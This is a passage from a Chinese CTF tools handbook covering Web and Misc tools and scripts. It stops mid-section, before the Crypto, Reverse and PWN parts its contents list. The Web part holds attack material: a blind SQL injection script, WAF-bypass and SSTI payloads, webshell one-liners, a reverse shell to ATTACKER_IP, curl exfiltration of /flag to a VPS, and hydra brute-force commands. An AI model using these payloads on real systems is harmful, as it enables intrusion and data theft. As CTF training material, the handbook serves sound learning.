# CTF 工具集锦与代码脚本

> 按 Web / Misc / Crypto / Reverse / PWN 五大方向整理常用工具和实战脚本，开箱即用。

## 各方向重点工具速查

| 方向      | 重点推荐（★）                           | 一句话定位                     |
| ------- | --------------------------------- | ------------------------- |
| Web     | Burp Suite / SQLMap / dirsearch   | 抓包改包 / SQL 注入 / 目录扫描      |
| Misc    | CyberChef / Wireshark / binwalk   | 编解码 / 流量分析 / 文件提取         |
| Crypto  | factordb / RsaCtfTool / hashcat   | 大数分解 / RSA 攻击 / 哈希破解      |
| Reverse | IDA Pro / GDB+pwndbg / jadx       | 静态反编译 / 动态调试 / Android 逆向 |
| PWN     | pwntools / GDB+pwndbg / ROPgadget | PWN 框架 / 动态调试 / ROP 查找    |

> 每个方向章节开头另有该方向的"重点推荐"引用块，相似工具组的选用逻辑见各章节"工具选用建议"段落。

***

## 目录

- [一、Web 方向](#一web-方向)
- [二、Misc 方向](#二misc-方向)
- [三、Crypto 方向](#三crypto-方向)
- [四、Reverse 方向](#四reverse-方向)
- [五、PWN 方向](#五pwn-方向)
- [六、通用工具与技巧](#六通用工具与技巧)

***

## 一、Web 方向

> 本方向重点推荐：★Burp Suite（抓包改包核心，所有 HTTP 流量必经）｜★SQLMap（SQL 注入自动化脱库）｜★dirsearch（目录扫描首选，字典内置、输出友好）
> 使用方法：Burp Suite → 独立指南 ｜ SQLMap → 1.3 速查 + 独立指南 ｜ dirsearch → 1.7
> 各相似工具组的选用逻辑见下方"工具选用建议"段落

### 1.1 工具清单

| 工具             | 用途          | 关键用法                                                                                                                 | GitHub 地址                                     |
| -------------- | ----------- | -------------------------------------------------------------------------------------------------------------------- | --------------------------------------------- |
| ★Burp Suite    | 抓包改包、扫描爆破   | 浏览器设代理 127.0.0.1:8080 → Proxy 拦截Repeater 重放改包、Intruder 爆破→ 详见 \[Burp Suite 指南]\(Burp Suite实战使用指南.md)                 | 商业软件                                          |
| ★SQLMap        | 自动化 SQL 注入  | `sqlmap -u URL --dbssqlmap -u URL -D db -T tbl --dump--tamper=space2comment` 绕 WAF → 详见 [SQLMap 指南](SQLMap实战使用指南.md) | <https://github.com/sqlmapproject/sqlmap>     |
| ★dirsearch     | 目录扫描        | `dirsearch -u URL -e php,htmldirsearch -u URL -w dict.txt --recursive`                                               | <https://github.com/maurosoria/dirsearch>     |
| gobuster       | 目录/子域名爆破    | `gobuster dir -u URL -w wordlist.txtgobuster dns -d domain.com -w sub.txt`                                           | <https://github.com/OJ/gobuster>              |
| ★AntSword（哥斯拉） | WebShell 管理 | 连接一句话木马（填 URL + 密码）虚拟终端执行命令、文件管理                                                                                     | <https://github.com/AntSwordProject/antSword> |
| hydra          | 暴力破解        | `hydra -l user -P pass.txt URL http-post-formhydra -L users.txt -P pass.txt ssh://IP`                                | <https://github.com/vanhauser-thc/thc-hydra>  |
| ★curl          | 构造 HTTP 请求  | `curl -X POST -d "k=v" URLcurl -H "Cookie: x=1" URLcurl -x http://127.0.0.1:8080 URL`（走 Burp）                        | 系统自带                                          |
| HackBar        | 浏览器快速编码/注入  | F12 → HackBar 面板快速 URL/Base64 编码、SQL/XSS 执行                                                                          | 浏览器插件                                         |
| Postman        | API 测试      | 构造复杂请求、批量测试支持环境变量、集合管理                                                                                               | 商业软件                                          |

**工具选用建议**：

- 目录扫描：dirsearch ★ 与 gobuster 功能重叠。dirsearch 用 Python 写、字典内置、输出友好，CTF 日常首选；gobuster 用 Go 写、速度快，适合大规模爆破子域名（`gobuster dns`）或对速度敏感场景
- HTTP 请求构造：curl ★ 日常命令行测接口最轻量，可走 Burp 代理联调；Postman 适合需要环境变量、集合管理的复杂 API 调试；简单编码注入直接用浏览器 HackBar
- 抓包改包：Burp Suite ★ 是 Web 方向核心，所有 HTTP 流量必经它，完整用法见 \[Burp Suite 指南]\(Burp Suite实战使用指南.md)
- SQL 注入：SQLMap ★ 自动化脱库，标准 GET/POST 注入直接跑；识别失败或非常规注入点（JSON/GraphQL）转手工注入，完整参数与 tamper 见 [SQLMap 指南](SQLMap实战使用指南.md)
- WebShell 管理：AntSword ★ 连一句话木马后可视化操作文件和终端，必备
- 暴力破解：hydra 通用型，支持 SSH/HTTP/FTP 等多种协议；CTF 登录爆破常用 `http-post-form` 模块

### 1.2 SQL 注入脚本

```python
#!/usr/bin/env python3
"""
SQL 布尔盲注自动化脚本
适用于页面有真/假两种状态的注入点
"""

import requests
import sys

def extract_flag(url, true_indicator, payload_template, start=1, end=50):
    """
    url: 目标 URL
    true_indicator: 真条件页面包含的字符串
    payload_template: 注入 payload，{pos} 替换字符位置，{char} 替换 ASCII 值
    """
    flag = ""
    for pos in range(start, end + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = payload_template.format(pos=pos, char=mid)
            try:
                if "SELECT" in payload_template.upper():
                    r = requests.get(url + payload, timeout=10)
                else:
                    r = requests.get(url.format(payload=payload), timeout=10)
                if true_indicator in r.text:
                    low = mid + 1
                else:
                    high = mid - 1
            except requests.RequestException:
                continue
        if low - 1 <= 32:
            break
        flag += chr(low - 1)
        print(f"[+] 位置 {pos}: {flag}")
    return flag

# 用法示例：修改 payload_template 适配具体题目
if __name__ == "__main__":
    # 示例：?id=1' and ascii(substr((select flag from flag),{pos},1))>{char}--+
    # url = "http://target.com/index.php"
    # extract_flag(url, "success", "' and ascii(substr((select flag from flag),{pos},1))>{char}--+", 1, 50)
    print("请根据题目修改 url、true_indicator、payload_template 后运行")
```

### 1.3 SQLMap 常用命令速查

> 完整参数、tamper 绕过 WAF、OS Shell 等进阶用法见 [SQLMap 实战使用指南](SQLMap实战使用指南.md)。

```bash
# 检测注入点
sqlmap -u "http://target.com/page.php?id=1" --batch

# 爆数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 爆表
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# 爆字段
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --columns

# 爆数据
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename -C col1,col2 --dump

# POST 注入
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123" --batch

# Cookie 注入
sqlmap -u "http://target.com/page.php" --cookie="id=1" --batch

# 绕过 WAF（tamper 脚本）
sqlmap -u URL --tamper=space2comment,between --batch

# 常用 tamper 脚本
# space2comment    空格→/**/
# between          用 BETWEEN 替代 >
# charencode       URL 编码
# randomcase       随机大小写
```

### 1.4 命令执行绕过速查

```bash
# 空格绕过
cat${IFS}flag.txt          # $IFS
cat$IFS$9flag.txt          # $IFS$9
{cat,flag.txt}             # 大括号扩展
cat<flag.txt               # 重定向
%09cat%09flag.txt          # URL 编码 Tab

# 关键字绕过
c'a't flag.txt             # 单引号
c"a"t flag.txt             # 双引号
c\at flag.txt              # 反斜杠
ca$@t flag.txt             # 特殊变量
/bin/cat flag.txt          # 绝对路径

# 无回显（反弹 Shell）
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# 无回显（DNS 外带）
curl http://your-vps/$(cat /flag | base64)

# 无回显（HTTP 外带）
curl http://your-vps/?flag=$(cat /flag)
```

### 1.5 PHP 反序列化 POP 链构造模板

```python
#!/usr/bin/env python3
"""
PHP 反序列化 payload 生成器
根据题目源码修改类定义和属性值
"""

import urllib.parse

class PopChain:
    """根据题目源码替换类名和属性"""

    def __init__(self):
        # 示例：常见 pop 链结构
        # class A { public $obj; }  → 触发 __destruct
        # class B { public $cmd; }  → 触发 __toString → 命令执行
        pass

    @staticmethod
    def generate(payload_cmd: str) -> str:
        """生成序列化字符串，需要根据题目源码手动构造"""
        # 模板：修改类名、属性名、属性值适配题目
        # 示例结构：A.__destruct → B.__toString → system(cmd)
        serialized = f'O:1:"A":1:{{s:3:"obj";O:1:"B":1:{{s:3:"cmd";s:{len(payload_cmd)}:"{payload_cmd}";}}}}'
        return serialized

    @staticmethod
    def url_encode(serialized: str) -> str:
        """URL 编码，用于 GET 传参"""
        return urllib.parse.quote(serialized)


if __name__ == "__main__":
    cmd = "cat /flag"
    payload = PopChain.generate(cmd)
    print(f"[+] 序列化 payload:\n{payload}")
    print(f"\n[+] URL 编码:\n{PopChain.url_encode(payload)}")
    print(f"\n[+] 提示：根据题目源码修改 generate() 中的类定义和属性")
```

### 1.6 SSTI 检测与利用

```bash
# 检测模板注入（按顺序尝试）
{{7*7}}                    # Jinja2/Twig → 49
${7*7}                     # Freemarker → 49
#{7*7}                     # Thymeleaf
<%= 7*7 %>                 # ERB → 49

# Jinja2 命令执行
{{''.__class__.__mro__[1].__subclasses__()}}
# 找到 os._wrap_close 类（通常索引 132 附近），执行：
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}

# Jinja2 简短 payload
{% set x=joiner|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')() %}{{x}}

# Twig 命令执行
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

### 1.7 目录扫描（dirsearch / gobuster）

```bash
# === dirsearch（Python，字典内置，CTF 首选）===
dirsearch -u http://target.com/ -e php,html,txt       # 基础扫描
dirsearch -u http://target.com/ -w /path/custom.txt   # 自定义字典
dirsearch -u http://target.com/ --recursive           # 递归扫描
dirsearch -u http://target.com/ -e php --exclude=403,404  # 排除状态码
dirsearch -u http://target.com/ -t 30                 # 30 线程加速
dirsearch -u http://target.com/ --proxy http://127.0.0.1:8080  # 走 Burp

# 常用字典（Kali 自带）
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Discovery/Web-Content/

# === gobuster（Go，速度快）===
gobuster dir -u http://target.com/ -w wordlist.txt -x php,html  # 目录
gobuster dir -u http://target.com/ -w wordlist.txt -s 200,301   # 只看这些状态码
gobuster dns -d target.com -w subdomains.txt -t 50             # 子域名爆破
gobuster vhost -u http://target.com -w hosts.txt               # 虚拟主机爆破

# 选用建议
# CTF 日常 / 需要递归 / 想看输出友好 → dirsearch
# 大规模子域名 / 追求速度 → gobuster
```

### 1.8 AntSword 蚁剑使用方法

```bash
# 1. 安装：git clone https://github.com/AntSwordProject/antSword.git
#    cd antSword && npm install && npm start
#    或下载 AntSwordLoader 启动

# 2. 连接一句话木马
#    题目上传的 shell 一般长这样：
#    <?php @eval($_POST['cmd']); ?>
#    或 ASP: <%eval request("cmd")%>
#    或 JSP: Runtime.getRuntime().exec(request.getParameter("cmd"))

# 3. AntSword 操作
#    打开 → 右上"添加数据" → 填写：
#      URL:  http://target.com/shell.php
#      密码: cmd（对应 $_POST['cmd'] 的参数名）
#      编码: URL 或 Base64（被 WAF 拦时换 Base64）
#      类型: PHP / ASP / JSP（对应木马语言）
#    保存 → 双击连接 → 进入管理界面

# 4. 核心功能
#    文件管理：上传/下载/编辑/删除文件，直接 cat /flag
#    虚拟终端：执行系统命令（id / whoami / cat /flag）
#    数据库管理：连数据库脱数据

# 5. 绕过防护
#    编码设置 → 选 Base64 / chr 编码绕过关键字检测
#    插件市场 → 装 "绕过 disable_functions" 提权
```

### 1.9 hydra 暴力破解使用方法

```bash
# === HTTP 表单登录爆破（CTF 最常见）===
# 语法: hydra -l 用户 -P 密码字典 URL http-post-form "参数:失败标志"
hydra -l admin -P rockyou.txt http://target.com/ http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
# ^USER^ 和 ^PASS^ 是占位符，hydra 自动替换
# F=incorrect 表示页面出现 "incorrect" 视为失败（S=success 表示成功）

# === 协议爆破 ===
hydra -L users.txt -P pass.txt ssh://1.2.3.4 -t 4           # SSH（限 4 线程）
hydra -L users.txt -P pass.txt ftp://1.2.3.4                 # FTP
hydra -l admin -P pass.txt 1.2.3.4 mysql                     # MySQL
hydra -l admin -P pass.txt 1.2.3.4 rdp                       # RDP 远程桌面
hydra -l admin -P pass.txt 1.2.3.4 smb                       # SMB
hydra -l admin -P pass.txt 1.2.3.4 pop3                      # POP3 邮箱

# === GET 请求爆破 ===
hydra -l admin -P pass.txt http://target.com/ http-get \
    "/admin/:F=401"

# 常用参数
# -l 指定单个用户 / -L 用户列表文件
# -p 指定单个密码 / -P 密码列表文件
# -t 并发数（SSH 建议 4，HTTP 可 16）
# -f 爆破成功立即停止
# -v 显示详细过程
# -o 结果保存到文件

# 选用建议
# Web 登录表单 → http-post-form 模块
# 协议服务 → 对应协议模块
# Web 复杂场景（需验证码/多步）→ 用 Burp Intruder 或自写脚本
```

***

## 二、Misc 方向

> 题型全景、解题决策树、各子题型深度实战（隐写术、流量分析、压缩包取证、多媒体隐写、内存取证、OSINT）见 [Misc 实战使用指南](Misc实战使用指南.md)。本节为日常高频用法速查。
> 本方向重点推荐：★CyberChef（编解码瑞士军刀，Magic 自动识别）｜★Wireshark（流量分析必备，pcap 解析核心）｜★binwalk（文件结构识别与自动提取）
> 使用方法：CyberChef → 2.7 + 独立指南 ｜ Wireshark → 2.5 + 独立指南 ｜ binwalk → 2.10
> 各相似工具组的选用逻辑见下方"工具选用建议"段落

### 2.1 工具清单

| 工具              | 用途           | 关键用法                                                                                                                  | GitHub 地址                                        |
| --------------- | ------------ | --------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| ★CyberChef      | 编解码瑞士军刀      | 在线拖拽操作链（From Base64 → From Hex → ...）支持 Magic 自动识别 → 详见 [CyberChef 指南](CyberChef实战使用指南.md)                            | <https://github.com/gchq/CyberChef>              |
| ★Wireshark      | 流量分析         | 显示过滤器 `http contains "flag"`Follow → TCP Stream 看会话File → Export Objects 还原文件 → 详见 [Wireshark 指南](Wireshark实战使用指南.md) [深度手册](Wireshark深度使用手册.md) | <https://github.com/wireshark/wireshark>         |
| ★binwalk        | 文件分析/提取      | `binwalk file` 分析结构`binwalk -e file` 自动提取隐藏文件                                                                         | <https://github.com/ReFirmLabs/binwalk>          |
| foremost        | 文件恢复         | `foremost -i file -o output/`按文件头 carving，不依赖格式识别                                                                     | SourceForge: <https://foremost.sourceforge.net/> |
| ★zsteg          | PNG/BMP 隐写检测 | `zsteg file.png` 自动检测 LSB`zsteg -a file.png` 全通道扫描                                                                    | <https://github.com/zed-0xff/zsteg>              |
| StegSolve       | 图片隐写分析（GUI）  | 打开图片 → 逐通道查看Analyse → LSB / Extract Data                                                                              | <https://github.com/eugenekolo/stegsolve>        |
| 010 Editor      | 十六进制编辑       | 修改文件头/尾、模板解析结构PNG 改 IHDR 高度、ELF 改字段                                                                                   | 商业软件                                             |
| John the Ripper | 密码哈希破解       | `john --wordlist=rockyou.txt hash.txtjohn --format=raw-sha256 hash.txt`                                               | <https://github.com/openwall/john>               |
| fcrackzip       | ZIP 密码破解     | `fcrackzip -u -D -p dict.txt file.zip-u` 用 unzip 验证避免误报                                                               | <https://github.com/hyc/fcrackzip>               |
| exiftool        | EXIF 信息查看    | `exiftool file.jpg` 看元数据题目常在备注/作者字段藏 flag                                                                             | <https://github.com/exiftool/exiftool>           |
| GIMP            | 图片处理         | 调整通道/偏移看隐藏内容改图层模式揭开隐写                                                                                                 | <https://github.com/GNOME/gimp>                  |
| Audacity        | 音频分析         | 打开音频 → 切换频谱图看摩尔斯/SSTV/高频藏 flag                                                                                        | <https://github.com/audacity/audacity>           |

**工具选用建议**：

- 编解码：CyberChef ★ 全能型，拖拽操作链 + Magic 自动识别，浏览器在线用最方便；本地批量解码用下方 2.2 脚本
- 流量分析：Wireshark ★ 看 pcap 必备，完整过滤器语法、文件还原、USB 取证见 [Wireshark 指南](Wireshark实战使用指南.md)；高级抓包、深度协议解析、网络取证、Lua 解析器、自动化流水线见 [Wireshark 深度手册](Wireshark深度使用手册.md)；批量提取字段用配套的 tshark 命令行
- 文件提取：binwalk ★ 自动识别文件结构并提取（含固件、嵌套压缩包）；foremost 按文件头 carving，binwalk 识别失败时换它，两者互补
- PNG/BMP 隐写：zsteg ★ 命令行一键自动检测 LSB，CTF 首选；StegSolve 是 Java GUI，适合逐通道人工观察、Extract Data 提取位平面，两者搭配用
- 密码破解：John 通用哈希破解（MD5/SHA 等，支持多种格式）；fcrackzip 专攻 ZIP，`-u` 验证避免误报；哈希暴力破解首选 hashcat（见 Crypto 章节，GPU 加速）
- 十六进制编辑：010 Editor 商业但模板解析强（PNG/ELF/ZIP 结构高亮）；免费替代用 hexedit 或 wxMEdit

### 2.2 编码解码脚本

```python
#!/usr/bin/env python3
"""
CTF 常见编码批量解码
自动尝试 Base64/32/16、Hex、URL、ROT13、摩尔斯等
"""

import base64
import urllib.parse
import codecs
import re
import sys

MORSE_TABLE = {
    '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
    '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
    '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
    '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
    '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
    '--..': 'Z', '-----': '0', '.----': '1', '..---': '2',
    '...--': '3', '....-': '4', '.....': '5', '-....': '6',
    '--...': '7', '---..': '8', '----.': '9',
}


def try_base64(s):
    try:
        decoded = base64.b64decode(s).decode('utf-8', errors='ignore')
        if decoded.isprintable() and len(decoded) > 0:
            return f"[Base64] {decoded}"
    except Exception:
        pass
    return None


def try_base32(s):
    # Base32 要求长度是 8 的倍数，自动补 =
    padded = s + '=' * ((8 - len(s) % 8) % 8)
    try:
        decoded = base64.b32decode(padded).decode('utf-8', errors='ignore')
        if decoded.isprintable() and len(decoded) > 0:
            return f"[Base32] {decoded}"
    except Exception:
        pass
    return None


def try_base16(s):
    try:
        decoded = base64.b16decode(s, casefold=True).decode('utf-8', errors='ignore')
        if decoded.isprintable() and len(decoded) > 0:
            return f"[Base16] {decoded}"
    except Exception:
        pass
    return None


def try_hex(s):
    try:
        decoded = bytes.fromhex(s).decode('utf-8', errors='ignore')
        if decoded.isprintable() and len(decoded) > 0:
            return f"[Hex] {decoded}"
    except Exception:
        pass
    return None


def try_url(s):
    if '%' in s:
        try:
            decoded = urllib.parse.unquote(s)
            if decoded != s:
                return f"[URL] {decoded}"
        except Exception:
            pass
    return None


def try_rot13(s):
    decoded = codecs.decode(s, 'rot_13')
    if decoded != s:
        return f"[ROT13] {decoded}"
    return None


def try_morse(s):
    # 摩尔斯电码，分隔符为空格或 / 或 |
    if not re.match(r'^[.\-/|\s]+$', s):
        return None
    sep = '/' if '/' in s else ('|' if '|' in s else ' ')
    letters = s.strip().split(sep)
    result = ""
    for letter in letters:
        letter = letter.strip()
        if letter in MORSE_TABLE:
            result += MORSE_TABLE[letter]
        elif letter == '':
            result += ' '
        else:
            return None
    if result.strip():
        return f"[Morse] {result}"
    return None


def auto_decode(s):
    """自动尝试所有编码"""
    print(f"\n输入: {s[:100]}{'...' if len(s) > 100 else ''}")
    print("-" * 50)
    decoders = [try_base64, try_base32, try_base16, try_hex, try_url, try_rot13, try_morse]
    for decoder in decoders:
        result = decoder(s.strip())
        if result:
            print(result)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        auto_decode(sys.argv[1])
    else:
        print("用法: python3 decode_all.py <编码字符串>")
        # 示例
        print("\n--- 示例 ---")
        auto_decode("ZmxhZ3toZWxsb30=")  # Base64: flag{hello}
        auto_decode("666c61677b68656c6c6f7d")  # Hex: flag{hello}
```

### 2.3 文件类型识别脚本

```python
#!/usr/bin/env python3
"""
文件魔数识别
根据文件头部字节判断文件真实类型
"""

import struct

FILE_SIGNATURES = {
    b'\x89PNG\r\n\x1a\n': 'PNG 图片',
    b'\xff\xd8\xff': 'JPEG 图片',
    b'GIF87a': 'GIF 图片 (87a)',
    b'GIF89a': 'GIF 图片 (89a)',
    b'BM': 'BMP 图片',
    b'PK\x03\x04': 'ZIP 压缩包 / DOCX / APK',
    b'PK\x05\x06': 'ZIP 压缩包 (空)',
    b'\x1f\x8b': 'GZIP 压缩',
    b'Rar!\x1a\x07': 'RAR 压缩包',
    b'7z\xbc\xaf\x27\x1c': '7z 压缩包',
    b'%PDF': 'PDF 文档',
    b'\x25\x45\x4f\x46': 'EPS/PS 文件',
    b'\x7fELF': 'ELF 可执行文件 (Linux)',
    b'MZ': 'PE 可执行文件 (Windows EXE/DLL)',
    b'\xca\xfe\xba\xbe': 'Java Class / Mach-O',
    b'\xfe\xed\xfa\xce': 'Mach-O 32-bit',
    b'\xfe\xed\xfa\xcf': 'Mach-O 64-bit',
    b'\xce\xfa\xed\xfe': 'Mach-O 32-bit (反序)',
    b'\xcf\xfa\xed\xfe': 'Mach-O 64-bit (反序)',
    b'\xd0\xcf\x11\xe0': 'MS Office (DOC/XLS/PPT)',
    b'RIFF': 'RIFF 容器 (AVI/WAV/WebP)',
    b'fLaC': 'FLAC 音频',
    b'ID3': 'MP3 音频 (ID3标签)',
    b'\xff\xfb': 'MP3 音频',
    b'OggS': 'OGG 音频',
    b'SQLite format 3\x00': 'SQLite 数据库',
    b'<?xml': 'XML 文件',
    b'<html': 'HTML 文件',
    b'\x00\x00\x00\x1c': 'MP4 视频 (ftyp)',
    b'\x00\x00\x00\x20': 'MP4 视频 (ftyp)',
}


def identify(filepath):
    """识别文件真实类型"""
    with open(filepath, 'rb') as f:
        header = f.read(32)

    print(f"文件: {filepath}")
    print(f"头部 (Hex): {header[:16].hex()}")

    for sig, ftype in FILE_SIGNATURES.items():
        if header.startswith(sig):
            print(f"识别结果: {ftype}")
            return ftype

    # 检查是否为文本文件
    try:
        header.decode('utf-8')
        print("识别结果: 文本文件 (UTF-8)")
    except UnicodeDecodeError:
        print("识别结果: 未知文件类型")

    return None


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        identify(sys.argv[1])
    else:
        print("用法: python3 file_id.py <文件路径>")
```

### 2.4 ZIP 伪加密修复脚本

```python
#!/usr/bin/env python3
"""
ZIP 伪加密检测与修复
CTF 中 ZIP 伪加密的原理：修改本地/全局文件头的加密标志位，
使解压软件误认为文件加密，实际数据并未加密
"""

import struct
import shutil
import sys
import os


def check_fake_encryption(filepath):
    """检测 ZIP 伪加密并修复"""
    # 备份原文件
    backup = filepath + ".bak"
    shutil.copy2(filepath, backup)
    print(f"[*] 已备份原文件到 {backup}")

    with open(filepath, 'rb') as f:
        data = bytearray(f.read())

    fixed = False
    pos = 0

    while pos < len(data) - 4:
        # 本地文件头签名: PK\x03\x04
        if data[pos:pos+4] == b'PK\x03\x04':
            # 通用位标志偏移: 6, 长度: 2
            flag_offset = pos + 6
            flag = struct.unpack_from('<H', data, flag_offset)[0]
            encrypted = bool(flag & 0x01)
            if encrypted:
                print(f"[!] 位置 0x{flag_offset:04x}: 本地文件头加密标志位 = 1 (伪加密?)")
                data[flag_offset] = flag & 0xFE  # 清除加密位
                fixed = True
                print(f"[+] 已修复: 清除本地文件头加密位")

            # 跳过本地文件头
            comp_size = struct.unpack_from('<I', data, pos + 18)[0]
            uncomp_size = struct.unpack_from('<I', data, pos + 22)[0]
            fname_len = struct.unpack_from('<H', data, pos + 26)[0]
            extra_len = struct.unpack_from('<H', data, pos + 28)[0]
            pos += 30 + fname_len + extra_len + comp_size

        # 中央目录文件头签名: PK\x01\x02
        elif data[pos:pos+4] == b'PK\x01\x02':
            flag_offset = pos + 8
            flag = struct.unpack_from('<H', data, flag_offset)[0]
            encrypted = bool(flag & 0x01)
            if encrypted:
                print(f"[!] 位置 0x{flag_offset:04x}: 中央目录加密标志位 = 1 (伪加密?)")
                data[flag_offset] = flag & 0xFE
                fixed = True
                print(f"[+] 已修复: 清除中央目录加密位")

            fname_len = struct.unpack_from('<H', data, pos + 28)[0]
            extra_len = struct.unpack_from('<H', data, pos + 30)[0]
            comment_len = struct.unpack_from('<H', data, pos + 32)[0]
            pos += 46 + fname_len + extra_len + comment_len

        else:
            pos += 1

    if fixed:
        output = filepath.replace('.zip', '_fixed.zip')
        with open(output, 'wb') as f:
            f.write(data)
        print(f"\n[+] 修复完成，输出: {output}")
        print(f"[+] 尝试解压: unzip {output}")
    else:
        print("\n[-] 未检测到伪加密，文件可能是真加密或不是 ZIP 格式")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        check_fake_encryption(sys.argv[1])
    else:
        print("用法: python3 zip_fake_encrypt.py <zip文件路径>")
```

### 2.5 流量分析常用技巧

> 完整过滤器语法、文件还原、USB 键鼠取证、tshark 批处理见 [Wireshark 实战使用指南](Wireshark实战使用指南.md)。高级抓包、TLS/无线深度解析、网络取证工作流、Lua 解析器、自动化流水线见 [Wireshark 深度使用手册](Wireshark深度使用手册.md)。

```bash
# Wireshark 过滤器
http                              # 仅 HTTP 流量
http.request.method == "POST"      # POST 请求
tcp.port == 4444                   # 指定端口
ip.addr == 10.0.0.1               # 指定 IP
http contains "flag"               # HTTP 包含 flag
tcp contains "flag"                # TCP 包含 flag

# TCP 流追踪：右键包 → Follow → TCP Stream

# tshark 命令行提取
tshark -r file.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r file.pcap -Y "http" -T fields -e http.file_data
tshark -r file.pcap -Y "tcp.port==4444" -T fields -e data | tr -d '\n' | xxd -r -p

# 提取 HTTP 传输的文件
tshark -r file.pcap --export-objects http,./output/

# USB 流量提取键鼠数据
tshark -r file.pcap -Y "usb.capdata" -T fields -e usb.capdata
```

### 2.6 图片隐写常用命令

```bash
# 文件信息
file image.png
exiftool image.png
strings image.png | grep -i flag

# Binwalk 分析与提取
binwalk image.png          # 分析
binwalk -e image.png       # 自动提取

# PNG LSB 隐写
zsteg image.png            # 自动检测
zsteg -a image.png         # 全通道检测

# StegSolve (Java GUI)
# 打开图片 → 逐通道查看 → 查 LSB

# 图片拼接/高度修改
# 用 010 Editor 打开，修改 IHDR 中的高度字段
# PNG 高度在文件头第 20-23 字节（大端序）

# 盲水印
python3 bwmforpy3.py decode ori.png watermarked.png output.png
```

### 2.7 CyberChef 使用方法

> 完整操作分类、Magic 自动识别、Recipe 保存分享、Registers/Fork 进阶、CTF 各题型实战见 [CyberChef 实战使用指南](CyberChef实战使用指南.md)。本节为日常高频用法速查。

CyberChef 是 GCHQ 出品的浏览器端编解码/加密瑞士军刀，Misc 和 Crypto 方向最高频工具。在线地址 <https://gchq.github.io/CyberChef/，也可离线部署。>

```text
核心概念：Recipe（配方）= Operations（操作）的串联链
左侧 Operations 面板 → 拖操作到中间 Recipe → 右侧 Input 输入 → Output 输出
```

**常用操作（Operations 分类）**：

| 分类          | 常用操作                       | 用途                |
| ----------- | -------------------------- | ----------------- |
| Data format | From Base64 / To Base64    | Base64 编解码        |
| Data format | From Hex / To Hex          | 十六进制 ↔ 字符串        |
| Data format | From Charcode              | ASCII 码转字符        |
| URL         | URL Decode / URL Encode    | URL 编解码           |
| Encryption  | AES Encrypt / Decrypt      | AES 加解密（需 key/IV） |
| Encryption  | DES Encrypt / Decrypt      | DES 加解密           |
| Encryption  | RC4                        | RC4 流密码           |
| Hashing     | MD5 / SHA1 / SHA256        | 哈希计算              |
| Hashing     | HMAC                       | 带 key 的哈希         |
| Encoding    | To Morse Code / From Morse | 摩尔斯电码             |
| Encoding    | To Braille / From Braille  | 盲文                |
| Conversion  | To Decimal / From Decimal  | 十进制转换             |
| Utils       | Magic                      | 自动识别编码/加密（神器）     |

**实战工作流**：

```text
# 场景1：未知编码自动识别（最常用）
# 拿到一串乱码不知是什么编码 → 拖入 Magic 操作
# Magic 会自动尝试 Base64/Hex/Rot13/... 列出最可能结果
Input: ZmxhZ3toZWxsb30=
Operation: Magic (Depth 3)
Output: flag{hello}  ← 自动识别为 Base64

# 场景2：多层嵌套解码
# Base64 套 Hex 套 URL，逐个拖操作：
Recipe: From Base64 → From Hex → URL Decode → Remove null bytes
# 顺序就是从外到内逐层剥离

# 场景3：AES 解密
# 需要 key 和 IV（题目给）
Recipe: AES Decrypt
  Key (Hex): 0123456789abcdef0123456789abcdef
  IV (Hex):  fedcba9876543210fedcba9876543210
  Mode: CBC
  Input: Hex
  Output: Text

# 场景4：XOR 解密（已知 key）
Recipe: XOR
  Key: UTF8 "secret"
  Scheme: Standard

# 场景5：哈希碰撞 / 验证
Recipe: MD5  → 对比题目给的哈希值
```

**实用技巧**：

```text
# 1. Magic 是首选：拿到任何不明数据先扔给 Magic
# 2. 调整 Magic 的 Depth（深度）：默认 3，调到 5 能识别更深嵌套
# 3. 保存 Recipe：复杂配方可导出分享 URL（Copy recipe link）
# 4. 批量处理：Input 框支持多行，逐行处理用 Fork 操作
# 5. 常见 flag 提取套路：
#    题目数据 → Magic → 看到 flag{...} 即成功
#    或：From Base64 → From Hex → grep "flag"
```

### 2.8 十六进制编辑（010 Editor）

```bash
# 010 Editor 商业软件，模板解析是核心优势
# 免费替代：hexedit / wxMEdit / HxD（Windows）

# === CTF 常见操作 ===
# 1. PNG 高度修改（图片被裁剪藏 flag）
#    打开 PNG → 自动应用 PNG 模板
#    找 IHDR 块 → height 字段 → 改大（如 200 → 500）
#    PNG 高度在文件头偏移 0x14-0x17（大端序 4 字节）
#    保存后图片下方露出隐藏内容

# 2. 文件头修复（文件头被破坏无法打开）
#    对比正常文件头：
#    PNG:  89 50 4E 47 0D 0A 1A 0A
#    JPG:  FF D8 FF
#    GIF:  47 49 46 38 (39) a
#    ZIP:  50 4B 03 04
#    PDF:  25 50 44 46
#    ELF:  7F 45 4C 46
#    改回正确文件头 → 保存

# 3. ZIP 伪加密修复
#    找到 PK 头 → 通用位标志（local header 偏移 6，central 偏移 8）
#    加密位 bit0 = 1 → 改为 0 → 保存

# 4. 模板使用
#    Templates 菜单 → 选 ZIP/PNG/ELF/PE 模板
#    自动解析结构，变量树一目了然

